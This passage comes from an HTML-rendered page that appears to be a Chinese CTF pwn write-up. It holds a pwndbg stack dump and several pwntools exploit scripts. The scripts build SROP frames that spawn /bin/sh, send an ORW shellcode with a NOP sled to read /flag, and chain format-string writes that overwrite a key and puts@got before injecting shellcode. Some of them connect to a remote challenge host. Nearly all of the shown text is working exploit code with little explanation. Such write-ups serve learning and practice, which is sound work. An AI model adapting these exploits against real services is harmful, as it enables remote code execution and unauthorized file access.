&lt;_start+3&gt;     mov    edx, 0x400       EDX =&gt; 0x400</span><br><span class="line">   0x401008 &lt;_start+8&gt;     mov    rsi, rsp         RSI =&gt; 0x7ffdec2f5348 —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line">   0x40100b &lt;_start+11&gt;    mov    rdi, rax         RDI =&gt; 0</span><br><span class="line"> ► 0x40100e &lt;_start+14&gt;    syscall  &lt;SYS_read&gt;</span><br><span class="line">        fd: 0 (pipe:[305198])</span><br><span class="line">        buf: 0x7ffcefb227d8[RSP] —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line">        nbytes: 0x400</span><br><span class="line">   0x401010 &lt;_start+16&gt;    ret                                &lt;_start&gt;</span><br><span class="line">     ↓</span><br><span class="line">   0x401008 &lt;_start+8&gt;     mov    rsi, rsp          RSI =&gt; 0x7ffcefb227e0 —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line">   0x40100b &lt;_start+11&gt;    mov    rdi, rax          RDI =&gt; 1</span><br><span class="line">   0x40100e &lt;_start+14&gt;    syscall</span><br><span class="line">   0x401010 &lt;_start+16&gt;    ret                                &lt;_start+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">───────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsi rsp ret 0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line">01:0008│             0x7ffcefb227e0 —▸ 0xdeadbeef</span><br><span class="line">02:0010│             0x7ffcefb227e8 —▸ 0x7ffcefb242d5 ◂— &#x27;COLORFGBG=15;0&#x27;</span><br><span class="line">03:0018│             0x7ffcefb227f0 —▸ 0x7ffcefb242e4 ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class="line">04:0020│             0x7ffcefb227f8 —▸ 0x7ffcefb242f8 ◂— &#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT=1&#x27;</span><br><span class="line">05:0028│             0x7ffcefb22800 —▸ 0x7ffcefb2431b ◂— &#x27;DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus&#x27;</span><br><span class="line">06:0030│             0x7ffcefb22808 —▸ 0x7ffcefb24351 ◂— &#x27;DESKTOP_SESSION=lightdm-xsession&#x27;</span><br><span class="line">07:0038│             0x7ffcefb22810 —▸ 0x7ffcefb24372 ◂— &#x27;DISPLAY=:0.0&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./SROP_1_x64&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">syscall_addr = start_addr + <span class="number">0x0e</span></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;set context-output /dev/pts/6&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(p8(<span class="number">0x08</span>))</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># read(0, stack_addr, 0x400) rax=0 rdi=0 rsi=stackaddr rdx=0x400</span></span><br><span class="line">sigframe = SigreturnFrame() </span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(start_addr)  + p64(0xdeadbeef)</span></span><br><span class="line"><span class="comment"># payload += bytes(sigframe)</span></span><br><span class="line">payload = flat([start_addr, <span class="number">0xdeadbeef</span>, <span class="built_in">bytes</span>(sigframe)]) <span class="comment"># 0xdeadbeef会被后面的syscall_addr覆盖</span></span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># constants.SYS_rt_sigreturn = 15</span></span><br><span class="line">padding = cyclic(constants.SYS_rt_sigreturn - <span class="built_in">len</span>(p64(syscall_addr)))</span><br><span class="line">io.send(flat([syscall_addr, padding])) <span class="comment"># 通过 SYS_read 返回 syscall 启动 SYS_rt_sigreturn(15)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------#</span></span><br><span class="line">bin_sh_offset = <span class="number">0x120</span></span><br><span class="line">bin_sh_addr = stack_addr + bin_sh_offset</span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, NULL, NULL) rax=0x3b rdi=&quot;/bin/sh&quot; rsi=0 rdx=0</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload += cyclic(bin_sh_offset - <span class="built_in">len</span>(payload)) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">padding = cyclic(constants.SYS_rt_sigreturn - <span class="built_in">len</span>(p64(syscall_addr)))</span><br><span class="line">io.send(flat([syscall_addr, padding])) <span class="comment"># 通过 SYS_read 返回 syscall 启动 SYS_rt_sigreturn(15)</span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------------#</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;&quot;&quot;set context-output /dev/pts/5</span></span><br><span class="line"><span class="comment"># b *0x401060&quot;&quot;&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">42011</span>)</span><br><span class="line">delim = <span class="string">b&#x27;Hello&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line">call_read = <span class="number">0x401040</span></span><br><span class="line">syscall_addr = <span class="number">0x40104E</span></span><br><span class="line"></span><br><span class="line">stack_addr = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = <span class="number">0x402000</span></span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">15</span>) + <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span> - <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1 = flat([padding, syscall_addr, <span class="built_in">bytes</span>(sigframe)])</span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------#</span></span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">bin_sh_offset = <span class="number">16</span></span><br><span class="line">bin_sh_addr = stack_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = <span class="number">0x402000</span></span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">15</span>) + <span class="string">b&#x27;\x00&#x27;</span> + bin_sh + cyclic(<span class="number">0x50</span> - <span class="number">16</span> - <span class="built_in">len</span>(bin_sh))</span><br><span class="line">payload2 = flat([padding, syscall_addr, <span class="built_in">bytes</span>(sigframe)])</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>ORW + nop</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;set context-output /dev/pts/5&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delim = <span class="string">b&#x27;Show me what you want to run: &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;/flag&quot;, 2)</span></span><br><span class="line"><span class="comment"># read(3, buf, 0x400)</span></span><br><span class="line"><span class="comment"># write(1, buf, 0x400)</span></span><br><span class="line">sh = <span class="string">&quot;&quot;&quot;mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 2</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 3</span></span><br><span class="line"><span class="string">    mov rsi, 0x20240000</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    mov rsi, 0x20240000</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall &quot;&quot;&quot;</span> </span><br><span class="line">padding = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">150</span> <span class="comment"># rand() % 256</span></span><br><span class="line">payload = padding + asm(sh)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">42013</span>)</span><br><span class="line">    io.sendafter(delim, payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>fmtstr_四马分肥</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;set context-output /dev/pts/5&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;Say something:&quot;</span></span><br><span class="line">payload1 = <span class="string">b&quot;%9$p\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">start_addr = <span class="built_in">int</span>(io.recv()[<span class="number">0</span>:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">key_addr = start_addr + (elf.symbols[<span class="string">&#x27;key&#x27;</span>] - elf.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key_addr:&quot;</span>, <span class="built_in">hex</span>(key_addr))</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x1919810</span></span><br><span class="line">key_num1 = key &amp; <span class="number">0xff</span></span><br><span class="line">key_num2 = (key &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">key_num3 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">key_num4 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%16c%8$hhn&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(key_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%152c%8$hhn&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(key_addr + <span class="number">1</span>)</span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%145c%8$hhn&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(key_addr + <span class="number">2</span>)</span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%1c%8$hhn&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(key_addr + <span class="number">3</span>)</span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&quot;stop\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload3)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.send(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>buf不在栈上的fmtstr + shellcode + ORW</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(pwnfile)</span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">43000</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/5&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;Say something:&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%7$p\x00&quot;</span> <span class="comment"># 泄露 proc 地址</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_80 = <span class="built_in">int</span>(io.recvline()[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">main_addr = main_80 - <span class="number">80</span></span><br><span class="line">proc_base = main_addr - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">what_addr = proc_base + elf.symbols[<span class="string">&#x27;what&#x27;</span>] <span class="comment"># what()函数调用mprotect((void *)0x114514000LL, 0x1000uLL, 7);,让shellcode地址变为可执行</span></span><br><span class="line">puts_got = proc_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%6$p\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp_main = <span class="built_in">int</span>(io.recvline()[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">rbp = rbp_main - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">addr1 = rbp + <span class="number">0x08</span> <span class="comment"># 7$</span></span><br><span class="line">addr2 = rbp + <span class="number">0x38</span> <span class="comment"># 13$</span></span><br><span class="line">addr3 = rbp + <span class="number">0x50</span> <span class="comment"># 16$</span></span><br><span class="line"></span><br><span class="line">addrs = [addr1, addr2, addr3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有4(或者3)个指针指向puts@got,这样就能通过这4(或者3)个$修改puts@got表项为我们想要执行的函数</span></span><br><span class="line"><span class="comment"># 这样每次在调用puts函数时就会执行我们想要的函数,或者自己写的指令</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    payload3 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addrs[i] &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn\x00&quot;</span></span><br><span class="line">    io.sendafter(delim, payload3)</span><br><span class="line">    payload4 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((puts_got + <span class="number">2</span> * i) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%39$hn\x00&quot;</span></span><br><span class="line">    io.sendafter(delim, payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#-----------------------------------------修改puts@got为(&amp;what)------------------------------------------------#</span></span><br><span class="line">what_addr_1 = what_addr &amp; <span class="number">0xffff</span></span><br><span class="line">what_addr_2 = (what_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">what_addr_3 = (what_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(what_addr_1).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%7$hn&quot;</span></span><br><span class="line">payload5 += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - what_addr_1 + what_addr_2).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%13$hn&quot;</span></span><br><span class="line">payload5 += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - what_addr_2 + what_addr_3).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%16$hn\x00&quot;</span></span><br><span class="line">io.sendafter(delim,  payload5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#----------------------------------修改puts@got为(&amp;shellcode)--------------------------------------------------#</span></span><br><span class="line">shellcode_addr = <span class="number">0x114514000</span> + <span class="number">0x27</span> <span class="comment"># len(payload6) = 0x27</span></span><br><span class="line"></span><br><span class="line">shellcode_addr_1 = shellcode_addr &amp; <span class="number">0xffff</span></span><br><span class="line">shellcode_addr_2 = (shellcode_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">shellcode_addr_3 = (shellcode_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">payload6 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(shellcode_addr_1).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%7$hn&quot;</span></span><br><span class="line">payload6 += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - shellcode_addr_1 + shellcode_addr_2).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%13$hn&quot;</span></span><br><span class="line">payload6 += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - shellcode_addr_2 + shellcode_addr_3).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%16$hn\x00&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">payload = payload6 + asm(shellcode)</span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;main+80&gt;:&quot;</span>, <span class="built_in">hex</span>(main_80))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;proc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(proc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;what&gt;: &quot;</span>, <span class="built_in">hex</span>(what_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$rbp =&quot;</span>, <span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 